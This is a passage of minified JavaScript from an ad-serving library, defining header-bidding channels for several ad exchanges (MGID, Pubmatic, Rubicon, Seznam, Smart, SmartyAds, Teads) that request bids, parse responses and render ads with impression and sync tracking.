          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    isAdValidForRender: function (t, e) {
      var i = e ? e.options.nativeOptions : this.definition.options.nativeOptions,
        r = t.title.length,
        n = t.description.length,
        s = t.image.width,
        a = t.image.height,
        o = s / a;
      if (!t.image || !t.title) return this.track.doError("[" + this.chd.tag + "] Insufficient data received (img:" + !!t.image + "|title:" + !!t.title + ")"), !1;
      if (i) {
        var d = i.maxTitleLength || i.maxTextLength,
          c = i.maxDescLength || i.maxTextLength;
        if (r > 80 && !d) return this.track.doError("mgid native - possible title overflow (" + r + "), style: " + e.name, "debug"), !1;
        if (n > 150 && !c) return this.track.doError("mgid native - possible description overflow (" + n + "), style: " + e.name, "debug"), !1;
        if (i.imgWidth && i.imgHeight) {
          var h = i.imgWidth,
            l = i.imgHeight,
            u = h / l;
          if (!(u < 1.5 ? o >= u / 1.1 && o <= u / .9 : o >= u / 1.15 && o <= u / .85)) return this.track.doError("mgid native - image not optimal, img [" + s + ", " + a + "], optimal [" + h + ", " + l + "], style: " + e.name, "debug"), !1;
        }
      } else this.track.doError("No native options included, style: " + e.name);
      return !0;
    },
    parseAssets: function (t) {
      var e = {};
      try {
        t.forEach(function (t) {
          var i = {
              1: "title",
              9: "data",
              3: "img",
              2: "img",
              5: "data",
              4: "data"
            }[t.id],
            r = {
              1: "title",
              9: "cta",
              3: "favicon",
              2: "image",
              5: "description",
              4: "advertiser"
            }[t.id],
            n = t[i];
          n && (e[r] = n.text || n.value || {
            url: n.url,
            width: n.w,
            height: n.h
          });
        });
      } catch (t) {}
      return e;
    },
    processResult: function (t, e, i) {
      var r = t ? t.native : null;
      if (!r || !r.assets || !r.link) return !1;
      var n = new AdTrack.AdSet();
      n.setStyle(i);
      var s = new AdTrack.AdChoices();
      s.setPromoClickUrl(this.chd.url), s.setPromoText(this.chd.title ? this.chd.title : "Reklama"), s.setOptional(!0), n.addAdChoices(s);
      var a = new AdTrack.TextAd(),
        o = r.link,
        d = o.clicktrackers || void 0,
        c = r.imptrackers || void 0,
        h = this.parseAssets(r.assets);
      if (!this.isAdValidForRender(h, i)) return !1;
      var l = h.image,
        u = h.favicon;
      a.addText(h.title, h.description), l && a.addScreenshot(l.url, l.width, l.height, l.url);
      var p = h.advertiser ? h.advertiser : "",
        f = "";
      u && u.url && (f = u.url);
      var g = !0 === this.definition.test ? "" : o.url;
      a.setClickTrackers(d), a.setClickUrl(g), a.setVisibleUrl(""), a.setAdUrl(""), a.setCta(h.cta), a.setFavicon(f), a.setCompanyName(p), a.done(), n.addAd(new AdTrack.MgidAd(n, a));
      var m = new AdTrack.TextChannel(this.track.window, this.track.definitionWrapper, this.chd, this.track.transforms, this.track.errorReporting),
        k = {
          chd: this.chd,
          ad: {
            type: "tcproxy",
            data: {
              adSet: n,
              tc: m
            }
          },
          style: i,
          count: 1,
          impTrackers: c
        };
      return new AdTrack.MediaTypes.Native(k, this.track.errorReporting);
    }
  };
}, function (t, e) {
  AdTrack.PubmaticHBOutstreamChannel = function (t, e, i, r) {
    this.track = t, this.definition = e, this.chd = i, this.data = r, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.helper = new AdTrack.PubmaticHelper(t, e, i), this.MTsupport = !0;
  }, AdTrack.PubmaticHBOutstreamChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.OUTSTREAM, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      if (this.data) this.track.doError("Data rendering not supported for " + this.chd.tag);else {
        var r = this.track.getChannelKey(this.chd, e);
        if (r) {
          var n = function (t) {
            if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
              var e = t.seatbid[0].bid[0];
              this.adData = e.adm;
              var r = AdTrack.MediaTypes.createVideoSettings(this.track, this.chd, e.adm, "vast_content"),
                n = new AdTrack.MediaTypes.Video(r, this.track.errorReporting);
              i(n);
            } else this.track.passback(this.definition, this.chd);
          }.bind(this);
          this.price && this.response ? n(this.response) : this.bid(function (t, e) {
            n(e);
          }, r);
        } else this.track.doError("Undefined key");
      }
    }
  };
}, function (t, e) {
  AdTrack.RubiconVideoHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.accountId = this.chd.accountId || AdTrack.Config.getAccountId("rubicon"), this.helper = new AdTrack.RubiconHelper(t, e, i, this.accountId), this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.RubiconVideoHBChannel.prototype = {
    report: function () {
      return this.response ? this.response : "";
    },
    bid: function (t, e) {
      this.helper.bid(this.bidResponse, e, this.helper.VIDEO, function (e, i) {
        this.price = e, this.response = i, t(e, i);
      }.bind(this));
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
            var e = t.seatbid[0].bid[0],
              r = e.adm || "",
              n = e.nurl || "";
            if (r || n) {
              if (this.definition.options.player && "default" === this.definition.options.player.type) {
                var s = AdTrack.MediaTypes.createVideoSettings(this.track, this.chd, n || r, n ? "vast_url" : "vast_content"),
                  a = new AdTrack.MediaTypes.Video(s, this.track.errorReporting);
                a.on("error", function () {
                  AdTrack.Utils.reportCreative(this.track.server, 343, this.chd.tag, e.crid, "", e.price || "", this.response);
                }.bind(this)), i(a);
              }
            } else this.track.doError("Rubicon video - no creative in response"), this.track.passback(this.definition, this.chd);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  };
}, function (t, e) {
  AdTrack.SeznamSspHbChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.delayTime = 1e3, this.destroyed = !1, this.helper = new AdTrack.SeznamHelper(t, e, i), this.trackServed = [], this.trackVisible = [], this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.SeznamSspHbChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      if (this.helper.isLangAllowed()) {
        var i = this,
          r = this.createData(e);
        AdTrack.Ajax.request({
          label: "SSSP bid",
          url: "https://ssp.seznam.cz/v2/rtb",
          method: "POST",
          data: JSON.stringify(r),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (e) {
          if (e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
            var r = e.seatbid[0].bid[0];
            e.cur && "CZK" === e.cur ? (i.price = AdTrack.Price.create(r.price, AdTrack.Price.CZK), i.bidResponse.setPrice(i.price), i.bidResponse.setWidth(r.w || i.width), i.bidResponse.setHeight(r.h || i.height)) : (i.price = null, i.track.doError("Unknown bid response currency '" + e.cur + "' passed to " + i.chd.tag));
          } else i.price = null;
          i.response1 = e, t && t(i.price, e);
        }).fail(function (e, r) {
          r ? i.track.evBidTimeout(i.definition, i.chd) : i.track.evBidError(i.definition, i.chd), i.price = null, t && t(null, null);
        }).send();
      } else t(null, null);
    },
    render: function (t, e, i) {
      var r = function (t) {
        var r = this;
        if (!t.seatbid) return this.track.doError("[" + this.chd.tag + "] Empty response from Seznam SSP"), void this.track.passback(this.definition, r.chd);
        var n = t.seatbid[0].bid[0],
          s = "";
        if (n.adm && "" !== n.adm) try {
          this.admJSON = JSON.parse(n.adm), s = this.admJSON.data, this.admJSON.width && this.admJSON.height && (this.chd.width = this.admJSON.width, this.chd.height = this.admJSON.height), this.admJSON.tracking && (this.admJSON.tracking.served && (this.trackServed = this.admJSON.tracking.served), this.admJSON.tracking.visible && (this.trackVisible = this.admJSON.tracking.visible));
        } catch (t) {
          return this.track.doError("[" + r.chd.tag + "] Unsupported adm response", t), void this.track.passback(this.definition, r.chd);
        } else s = t.seatbid[0].bid[0].nurl;
        var a = function (t) {
          if (t && t.ads) {
            if (r.response2 = t, t.ads) {
              if (t.ads.length <= 0) return r.track.doError("[" + r.chd.tag + "] Empty response from Seznam SSP"), void r.track.passback(r.definition, r.chd);
              var n = e && e.normal ? e.normal : null;
              r.helper.isProductAd(t.ads) && (n = e && e.product ? e.product : null), r.adData = t.ads, r.helper.servedTracking(r.trackServed);
              var s = null;
              (s = r.helper.isBranding(t.ads) ? r.helper.renderBranding(t.ads, r.chd.width, r.chd.height) : r.helper.processResult(t.ads, n, "sssp-hb")) ? (s.on("load", function () {
                r.track.renderer.on("impress", function () {
                  new Image().src = t.confirmImpUrl, r.trackVisible.forEach(function (t) {
                    new Image().src = t;
                  });
                });
              }), i(s)) : r.track.passback(r.definition, r.chd);
            } else r.track.doError("[" + r.chd.tag + "] Unknown response from Seznam SSP"), r.track.passback(r.definition, r.chd);
          } else r.track.passback(r.definition, r.chd);
        };
        void 0 === this.admJSON || "json_url" === this.admJSON.type ? AdTrack.Ajax.request({
          label: "SSSP ad request",
          url: s,
          method: "GET",
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: 0
        }, this.track.errorReporting).done(function (t) {
          a(t);
        }).fail(function (t) {
          r.track.doError("[" + r.chd.tag + "] Request to 'nurl' failed: " + t), r.track.passback(r.definition, r.chd);
        }).send() : "json" === this.admJSON.type ? a(this.admJSON.data) : (this.track.doError("[" + r.chd.tag + "] Unsupported response type: " + this.admJSON.type), this.track.passback(r.definition, r.chd));
      }.bind(this);
      if (this.price && this.response1) r(this.response1);else {
        var n = this.helper.getKeyBasedOnStyle(e, this.chd);
        n ? this.bid(function (t, e) {
          r(e);
        }, n) : this.track.doError("Undefined key");
      }
    },
    destroy: function () {
      this.destroyed = !0;
    },
    createData: function (t) {
      for (var e = function (t) {
          for (var e = "", i = 0; i < t; i++) e += Math.random().toString(36).substring(3, 4);
          return e;
        }(32), i = "AdTrack" + Math.round(1e9 * Math.random()), r = [{
          w: this.chd.width,
          h: this.chd.height
        }], n = this.chd.sizes ? this.chd.sizes : [], s = 0; s < n.length; s++) 2 === n[s].length && r.push({
        w: n[s][0],
        h: n[s][1]
      });
      return t ? {
        id: e,
        imp: [{
          id: i,
          tagid: t,
          banner: {
            format: r
          }
        }],
        site: {
          page: AdTrack.url
        },
        ext: {
          pvId: this.helper.generatePvId(),
          browserhash: this.helper.computeHash(),
          adblock: !1
        }
      } : (this.track.doError("[" + this.chd.tag + "] Key undefined"), {});
    }
  };
}, function (t, e) {
  AdTrack.SeznamSspHb2Channel = function (t, e, i) {
    (this.track = t, this.definition = e, this.chd = i, this.destroyed = !1, this.helper = new AdTrack.SeznamHelper(t, e, i), this.trackServed = [], this.trackVisible = [], this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, window.DOT || AdTrack.Libs.getLib("seznam-dot")) || AdTrack.Libs.deploy("seznam-dot", "https://h.seznam.cz/js/dot-small.js").onload(function () {
      DOT.cfg({
        service: "sklikp",
        load: !1,
        mousedown: !1
      });
    });
  }, AdTrack.SeznamSspHb2Channel.prototype = {
    report: function () {
      return this.response || "";
    },
    bid: function (t, e) {
      if (this.helper.isLangAllowed()) {
        var i = this,
          r = this.createData(e);
        AdTrack.Ajax.request({
          label: "SSSP bid",
          url: "https://ssp.seznam.cz/v2/rtb",
          method: "POST",
          data: JSON.stringify(r),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (e) {
          if (e.seatbid && e.seatbid[0] && e.seatbid[0].bid && e.seatbid[0].bid[0]) {
            var r = e.seatbid[0].bid[0];
            e.cur && "CZK" === e.cur ? (i.price = AdTrack.Price.create(r.price, AdTrack.Price.CZK), i.bidResponse.setPrice(i.price), i.bidResponse.setWidth(r.w || i.chd.width), i.bidResponse.setHeight(r.h || i.chd.height)) : (i.price = null, i.track.doError("Unknown bid response currency '" + e.cur + "' passed to " + i.chd.tag));
          } else i.price = null;
          i.response = e, t && t(i.price, e);
        }).fail(function (e, r) {
          r ? i.track.evBidTimeout(i.definition, i.chd) : i.track.evBidError(i.definition, i.chd), i.price = null, t && t(null, null);
        }).send();
      } else t(null, null);
    },
    render: function (t, e, i) {
      var r = function (t) {
        var r = this;
        if (t.seatbid && t.seatbid[0] && t.seatbid[0].bid && t.seatbid[0].bid[0]) {
          var n = t.seatbid[0].bid[0],
            s = "";
          if (n.adm && "" !== n.adm) try {
            this.admJSON = JSON.parse(n.adm), s = this.admJSON.data, this.admJSON.width && this.admJSON.height && (this.chd.width = this.admJSON.width, this.chd.height = this.admJSON.height), this.admJSON.tracking && (this.admJSON.tracking.served && (this.trackServed = this.admJSON.tracking.served), this.admJSON.tracking.visible && (this.trackVisible = this.admJSON.tracking.visible));
          } catch (t) {
            return this.track.doError("[" + r.chd.tag + "] Unsupported adm response", t), void this.track.passback(this.definition, r.chd);
          } else s = t.seatbid[0].bid[0].nurl;
          var a = function (t) {
            if (t && t.ads) {
              if (r.adResponse = t, t.ads) {
                if (t.ads.length <= 0) return r.track.doError("[" + r.chd.tag + "] Empty response from Seznam SSP"), void r.track.passback(r.definition, r.chd);
                var n = e && e.normal ? e.normal : null;
                r.helper.isProductAd(t.ads) && (n = e && e.product ? e.product : null), r.adData = t.ads, r.helper.servedTracking(r.trackServed);
                var s = null;
                (s = r.helper.isBranding(t.ads) ? r.helper.renderBranding(t.ads, r.chd.width, r.chd.height) : r.helper.processResult(t.ads, n, "sssp-hb")) ? (s.on("load", function () {
                  r.track.renderer.on("impress", function () {
                    new Image().src = t.confirmImpUrl, r.trackVisible.forEach(function (t) {
                      new Image().src = t;
                    });
                  });
                }), i(s)) : r.track.passback(r.definition, r.chd);
              } else r.track.doError("[" + r.chd.tag + "] Unknown response from Seznam SSP"), r.track.passback(r.definition, r.chd);
            } else r.track.passback(r.definition, r.chd);
          };
          void 0 === this.admJSON || "json_url" === this.admJSON.type ? AdTrack.Ajax.request({
            label: "SSSP ad request",
            url: s,
            method: "GET",
            json: !0,
            async: !this.definition.options.noAsync,
            headers: {},
            timeout: 0
          }, this.track.errorReporting).done(function (t) {
            a(t);
          }).fail(function (t) {
            r.track.doError("[" + r.chd.tag + "] Request to 'nurl' failed: " + t), r.track.passback(r.definition, r.chd);
          }).send() : "json" === this.admJSON.type ? a(this.admJSON.data) : (this.track.doError("[" + r.chd.tag + "] Unsupported response type: " + this.admJSON.type), this.track.passback(r.definition, r.chd));
        } else this.track.doError("[" + r.chd.tag + "] Empty response from Seznam SSP"), this.track.passback(r.definition, r.chd);
      }.bind(this);
      if (this.price && this.response) r(this.response);else {
        var n = this.helper.getKeyBasedOnStyle(e, this.chd);
        n ? this.bid(function (t, e) {
          r(e);
        }, n) : this.track.doError("Undefined key");
      }
    },
    destroy: function () {
      this.destroyed = !0;
    },
    createData: function (t) {
      for (var e = AdTrack.Utils.uuid(), i = "AdTrack" + Math.round(1e9 * Math.random()), r = AdTrack.Utils.getUrlWithoutSafeFrame(this.track), n = AdTrack.Utils.readCookie("sid"), s = [{
          w: this.chd.width,
          h: this.chd.height
        }], a = this.chd.sizes ? this.chd.sizes : [], o = 0; o < a.length; o++) 2 === a[o].length && s.push({
        w: a[o][0],
        h: a[o][1]
      });
      if (t) {
        var d = {
            id: e,
            imp: [{
              id: i,
              tagid: t,
              bidfloor: this.chd.bidFloor,
              bidfloorcur: "CZK",
              banner: {
                format: s
              }
            }],
            site: {
              page: r
            },
            user: {
              buyeruid: n
            },
            ext: {
              pvId: this.helper.generatePvId(),
              adblock: !1,
              source: ""
            }
          },
          c = null;
        return AdTrack.CMP && (c = AdTrack.CMP.getConsentData()), c && (this.track.evBidConsent(this.definition, this.chd, !0), d.user.ext = {}, d.user.ext.consent = c.consentString ? c.consentString : "", d.user.ext.gdpr = !!c.gdprApplies), d;
      }
      return this.track.doError("[" + this.chd.tag + "] Key undefined"), {};
    }
  };
}, function (t, e) {
  AdTrack.SmartHBOutstreamChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0;
  }, AdTrack.SmartHBOutstreamChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      var i = this.createData(e),
        r = this.__onSuccess.bind(this),
        n = this.__onError.bind(this);
      AdTrack.Ajax.request({
        label: "Smart outstream bid",
        url: "https://prg.smartadserver.com/prebid/v1",
        method: "POST",
        data: JSON.stringify(i),
        json: !0,
        async: !this.definition.options.noAsync,
        timeout: this.chd.timeout || 800,
        headers: {},
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (e) {
        r(e, t);
      }).fail(function (e, i) {
        n(e, i, t);
      }).send();
    },
    createData: function (t) {
      for (var e = [{
          w: this.chd.width,
          h: this.chd.height
        }], i = this.chd.sizes ? this.chd.sizes : [], r = 0; r < i.length; r++) {
        var n = {
          w: i[r][0],
          h: i[r][1]
        };
        e.push(n);
      }
      var s = t.split("-");
      3 !== s.length && this.track.doError("Wrong format for key, should be: [site_id]-[page_id]-[format_id]");
      var a = AdTrack.Utils.simpleStringGenerator(14),
        o = AdTrack.Utils.simpleStringGenerator(14),
        d = {
          siteid: s[0],
          pageid: s[1],
          formatid: s[2],
          currencyCode: "EUR",
          bidfloor: this.chd.bidFloor || 0,
          bidId: a,
          transactionId: o,
          tagId: this.track.unitID.getName(),
          timeout: 600,
          prebidVersion: "7.18.0",
          pageDomain: AdTrack.Utils.getDomain(this.definition.info),
          ckid: 0,
          mediatype: "banner",
          sizes: e
        },
        c = !1,
        h = !1,
        l = null;
      AdTrack.CMP && (l = AdTrack.CMP.getConsentData()), l && l.consentString && (c = !0, d.gdpr = l.gdprApplies ? 1 : 0, d.gdpr_consent = l.consentString, d.addtl_consent = l.addtlConsent);
      var u = null;
      AdTrack.USP && (u = AdTrack.USP.getConsentData()), u && u.consentString && (h = !0, d.us_privacy = u.consentString), (c || h) && this.track.evBidConsent(this.definition, this.chd, c, h);
      var p = this.track.getSupplyChain(!0);
      if (p && (d.schain = p), AdTrack.UserID && !this.track.getOption("disableUserId")) {
        var f = AdTrack.UserID.getAllUserIdsAsEids();
        f && (d.eids = f);
      }
      return d;
    },
    __onSuccess: function (t, e) {
      if (this.response = t, this.price = null, t && !t.isNoAd) {
        var i = t,
          r = AdTrack.Utils.isBlackListedAds(i.ad),
          n = AdTrack.Utils.testAd(i.ad, this.definition.options.contentBlackList || []);
        !1 === r && !1 === n ? i.currency === this.chd.currency ? (this.price = AdTrack.Price.create(i.cpm, this.chd.currency, null), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.creativeId), this.bidResponse.setWidth(i.width ? i.width : this.chd.width), this.bidResponse.setHeight(i.height ? i.height : this.chd.height)) : this.track.doError("Channel " + this.chd.tag + " responsed with wrong currency: " + i.currency) : (r && this.track.doError("Blocked Smart creative (" + i.creativeId + ") from " + r, "info"), this.chd.logs && this.chd.logs.blocked_creative && AdTrack.Utils.reportCreative(this.track.server, this.chd.logs.blocked_creative, this.chd.tag, i.creativeId || "", i.dealId, i.cpm, i.ad), e && e(null, null));
      }
      this.userSync(t), e && e(this.price, this.response);
    },
    __onError: function (t, e, i) {
      e ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, i && i(null, null);
    },
    render: function (t, e, i) {
      e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && !t.isNoAd) {
            this.adData = t.ad;
            var r = this.track.window.document.getElementById("AdTrackOutstreamSmart");
            if (r) this.track.doError("Smart outstream already on page"), this.track.passback(this.definition, this.chd);else {
              this.chd.width = t.width ? t.width : this.chd.width, this.chd.height = t.height ? t.height : this.chd.height;
              var n = "<html><head><script>window.inDapIF=true;<\/script></head><body>" + t.ad + "</body></html>",
                s = {
                  chd: this.chd,
                  ad: {
                    type: "content",
                    data: n
                  },
                  externalRender: !0
                },
                a = new AdTrack.MediaTypes.Video(s, this.track.errorReporting);
              a.on("beforeRender", function (t) {
                var i = t.ownerDocument || document;
                (r = i.createElement("div")).setAttribute("id", "AdTrackOutstreamSmart"), t.appendChild(r), this.track.addEvent(this.track.window, "adBegin", function () {
                  this.track.evImpress(this.definition, this.chd, e, 1);
                }.bind(this));
              }.bind(this)), i(a);
            }
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    userSync: function (t) {
      if (t) {
        var e = t.cSyncUrl,
          i = t.dspPixels;
        this.track.shouldCsync("smart") && AdTrack.UserSync.addUserSync("smart", 45, function () {
          null != e ? AdTrack.Utils.csyncFrame(e) : void 0 !== i && i.forEach(function (t) {
            AdTrack.Utils.firePixel(t);
          });
        }, this.track.settings);
      }
    }
  };
}, function (t, e) {
  var i;
  AdTrack.SmartyAdsHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.chd.sizes ? (this.sizes = this.chd.sizes, this.sizes.unshift([this.chd.width, this.chd.height])) : this.sizes = [[this.chd.width, this.chd.height]], this.bidResponse = new AdTrack.Bid(), this.MTsupport = !0, this.track.shouldCsync("smartyads") && AdTrack.UserSync.addUserSync("smartyads", 534, function () {
      AdTrack.SmartyAdsHBCSync();
    }.bind(this), this.track.settings);
  }, AdTrack.SmartyAdsHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      let i = AdTrack.Utils.windowTopAccess() || window;
      var r = {
          deviceWidth: screen.width,
          deviceHeight: screen.height,
          language: AdTrack.Utils.getLanguage(!0, !0),
          secure: AdTrack.Utils.isSecure(AdTrack.url) ? 1 : 0,
          host: i.location.host,
          page: i.location.pathname,
          ua: navigator.userAgent,
          placements: []
        },
        n = !1,
        s = !1,
        a = null;
      AdTrack.CMP && (a = AdTrack.CMP.getConsentData()), a && a.consentString && (n = !0, r.gdpr = a.gdprApplies ? 1 : 0, r.gdpr_consent = a.consentString);
      var o = null;
      AdTrack.USP && (o = AdTrack.USP), o && o.consentString && (s = !0, r.ccpa = o.consentString), (n || s) && this.track.evBidConsent(this.definition, this.chd, n, s), r.placements.push({
        placementId: Number(e),
        bidId: AdTrack.Utils.randomString("adtrack"),
        sizes: this.sizes,
        traffic: "banner"
      });
      var d = this.track.getSupplyChain();
      d && (r.schain = d);
      var c = function (e) {
          if (this.response = e, e && e[0]) {
            var i = e[0];
            i.currency && i.currency === AdTrack.Price.USD ? i.cpm ? (this.price = AdTrack.Price.create(i.cpm, AdTrack.Price.USD), this.bidResponse.setPrice(this.price), this.bidResponse.setCreativeId(i.creativeId), i.width && i.height ? (this.bidResponse.setWidth(i.width || this.chd.width), this.bidResponse.setHeight(i.height || this.chd.height), t && t(this.price, this.response)) : (this.track.doError("Channel " + this.chd.tag + " - dimensions missing."), t && t(null, null))) : t && t(null, null) : (this.track.doError("Channel " + this.chd.tag + " responded with wrong currency: " + i.currency), t && t(null, null));
          } else t && t(null, null);
        }.bind(this),
        h = function (e, i) {
          i ? this.track.evBidTimeout(this.definition, this.chd) : this.track.evBidError(this.definition, this.chd), this.price = null, t && t(null, null);
        }.bind(this);
      AdTrack.Ajax.request({
        label: "Smarty bid",
        url: "https://ssp-nj.webtradehub.com/?c=o&m=multi",
        method: "POST",
        async: !this.definition.options.noAsync,
        json: !0,
        timeout: this.chd.timeout || 800,
        data: JSON.stringify(r),
        ontimeout: function () {
          this.track.evBidTimeout(this.definition, this.chd, !0);
        }.bind(this),
        onerror: function () {
          this.track.evBidError(this.definition, this.chd, !0);
        }.bind(this)
      }, this.track.errorReporting).done(function (t) {
        c(t);
      }).fail(function (t, e) {
        h(t, e);
      }).send();
    },
    render: function (t, e, i) {
      this.container = t, e = e.normal;
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t[0] && t[0].ad) {
            var e = {
              chd: this.chd,
              width: this.bidResponse.getDimension().width,
              height: this.bidResponse.getDimension().height,
              ad: {
                data: "<html><head></head><body>" + t[0].ad + "</body></html>",
                type: "content"
              }
            };
            this.adData = e.ad.data;
            var r = new AdTrack.MediaTypes.Banner(e, this.track.errorReporting);
            r.on("load", function () {
              var e = r.getElement();
              e && AdTrack.Utils.addEvent(e, "load", function () {
                e.contentDocument.querySelectorAll("img:not([src])").length > 0 && this.track.doError("[" + this.chd.tag + "] Empty creative: '" + t[0].creativeId + "'", "debug");
              }.bind(this));
            }.bind(this)), i(r);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    }
  }, AdTrack.SmartyAdsHBCSync = AdTrack.SmartyAdsHBCSync || (i = !1, function () {
    i || (new Image().src = "https://ssp-nj.webtradehub.com/?c=o&m=cookie", i = !0);
  });
}, function (t, e) {
  var i;
  AdTrack.TeadsHBChannel = function (t, e, i) {
    this.track = t, this.definition = e, this.chd = i, this.price = null, this.response = null, this.bidResponse = new AdTrack.Bid(), this.pageId = null, this.placementId = null;
    try {
      var r = this.chd.keys[1].split("-");
      this.pageId = r[0], this.placementId = r[1];
    } catch (t) {}
    this.track.shouldCsync("teads") && AdTrack.UserSync.addUserSync("teads", 132, function () {
      AdTrack.TeadsCSync(this.pageId, this.placementId);
    }.bind(this), this.track.settings), this.MTsupport = !0;
  }, AdTrack.TeadsHBChannel.prototype = {
    report: function () {
      return this.adData || "";
    },
    bid: function (t, e) {
      if (AdTrack.Utils.windowTopAccess()) {
        var i = this.createData(e),
          r = this;
        AdTrack.Ajax.request({
          label: "Teads bid",
          url: "https://a.teads.tv/hb/bid-request",
          method: "POST",
          data: JSON.stringify(i),
          json: !0,
          async: !this.definition.options.noAsync,
          headers: {},
          timeout: this.chd.timeout || 800,
          ontimeout: function () {
            this.track.evBidTimeout(this.definition, this.chd, !0);
          }.bind(this),
          onerror: function () {
            this.track.evBidError(this.definition, this.chd, !0);
          }.bind(this)
        }, this.track.errorReporting).done(function (e) {
          var i = null;
          if (e && e.responses && e.responses[0]) {
            var n = e.responses[0];
            if (n.cpm) if (n.currency && n.currency !== AdTrack.Price.EUR && n.currency !== AdTrack.Price.USD && "CHF" !== n.currency) r.track.doError("Channel " + r.chd.tag + " responsed with wrong currency: " + n.currency);else {
              var s = n.cpm;
              "CHF" === n.currency && (s *= .98), n.currency === AdTrack.Price.USD && (s *= .96), i = AdTrack.Price.create(s, AdTrack.Price.EUR), r.bidResponse.setCreativeId(n.creativeId), r.bidResponse.setPrice(i), r.bidResponse.setWidth(n.width), r.bidResponse.setHeight(n.height);
            }
          }
          r.price = i, r.response = e, t && t(r.price, e);
        }).fail(function (e, i) {
          i ? r.track.evBidTimeout(r.definition, r.chd) : r.track.evBidError(r.definition, r.chd), r.track.debug("Channel", "Teads request failed: " + e, AdTrack.Log.WARNING), r.price = null, t && t(null, null);
        }).send();
      } else this.track.doError("[teads-hb] window.top not accessible"), this.price = null, this.response = null, t && t(this.price, this.response);
    },
    render: function (t, e, i) {
      var r = this.track.getChannelKey(this.chd, e);
      if (r) {
        var n = function (t) {
          if (t && t.responses && t.responses[0]) {
            if (this.track.window.document.getElementById("AdTrackTeadsContainer")) return this.track.doError("Teads container already on page"), void this.track.passback(this.definition, this.chd);
            var e = t.responses[0];
            this.adData = e.ad, this.chd.width = e.width ? e.width : this.chd.width, this.chd.height = e.height ? e.height : this.chd.height;
            var r = "<html><head></head><body>" + e.ad + "</body></html>",
              n = {
                chd: this.chd,
                width: 1,
                height: 1,
                ad: {
                  type: "content",
                  data: r
                },
                wrapAd: !0,
                externalRender: !0,
                preload: {}
              };
            n.preload.func = function () {
              var t = s.getElement();
              if (t) {
                var e = t.contentWindow,
                  i = function () {
                    var t = e.teads.TAG[this.pageId][this.placementId][0];
                    t && t.formatInstance && t.formatInstance.value && t.formatInstance.value.player && t.formatInstance.value.player.linearAd && t.formatInstance.value.player.linearAd.duration > 1 ? this.track.evImpress(this.definition, this.chd, null, 1) : setTimeout(i, 1e3);
                  }.bind(this);
                s.on("load", i);
                var r = 0,
                  n = function () {
                    if (e.teads && e.teads.TAG) {
                      try {
                        var t = e.teads.TAG[this.pageId][this.placementId][0].state;
                      } catch (t) {
                        return void s.error("Teads content check failed.");
                      }
                      if (2 === t || 3 === t) return void s.loaded();
                      if (4 === t || 5 === t) return void s.error();
                    }
                    r < 20 ? (r++, setTimeout(n, 200)) : s.error();
                  }.bind(this);
                n();
              }
            }.bind(this);
            var s = new AdTrack.MediaTypes.Video(n, this.track.errorReporting);
            s.on("beforeRender", function (t) {
              var e = this.track.window.document.createElement("div");
              e.setAttribute("id", "AdTrackTeadsContainer"), t.appendChild(e);
            }.bind(this)), i(s);
          } else this.track.passback(this.definition, this.chd);
        }.bind(this);
        this.price && this.response ? n(this.response) : this.bid(function (t, e) {
          n(e);
        }, r);
      } else this.track.doError("Undefined key");
    },
    createData: function (t) {
